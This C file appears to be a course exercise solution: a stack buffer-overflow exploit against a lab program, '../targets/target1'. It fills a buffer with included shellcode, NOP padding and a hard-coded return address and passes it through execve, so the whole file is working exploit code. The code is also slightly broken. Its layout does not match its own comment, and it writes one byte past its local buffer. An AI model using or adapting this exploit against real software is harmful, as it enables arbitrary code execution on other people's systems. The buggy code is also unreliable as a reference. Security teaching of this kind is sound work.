#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

static const size_t	buffer_len = 124; // used to be 90
// changed because I figure I want 40 NOPs, 46 shellcode, 40 returns
static const int	NOP = 0x90;

int
main ( int argc, char * argv[] )
{
	char buffer[buffer_len];
	memset((void *)buffer, NOP, buffer_len);
	

	memcpy((void*)buffer, (void*)shellcode, sizeof shellcode - 1);
	
	static char ret[] = "\x10\xfe\x21\x20";
	memcpy((void*)buffer+96+24, (void*)ret, sizeof ret);	
	
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;
	args[1] = buffer;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
